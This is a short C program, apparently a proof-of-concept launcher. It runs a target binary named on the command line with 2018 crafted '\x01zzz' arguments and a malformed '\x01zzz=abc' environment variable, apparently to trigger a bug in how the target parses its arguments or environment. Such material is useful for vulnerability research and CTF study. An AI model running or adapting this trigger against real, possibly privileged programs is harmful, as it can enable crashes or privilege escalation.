#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char* argv[], char* envp[]) {
    char* _argv[2018 + 1] = {};
    for (int i = 0; i < 2018; ++i) 
        _argv[i] = "\x01zzz";
    
    int envc = 0;
    while (envp[envc] != 0) envc++;
    envc++;

    char** _envp = malloc((envc + 1) * sizeof(char*));
    _envp[0] = "\x01zzz=abc";
    for (int i = 0; envp[i] != 0; ++i)
        _envp[i + 1] = envp[i];
    _envp[envc] = 0;

    execve(argv[1], _argv, _envp);
    return 0;
}

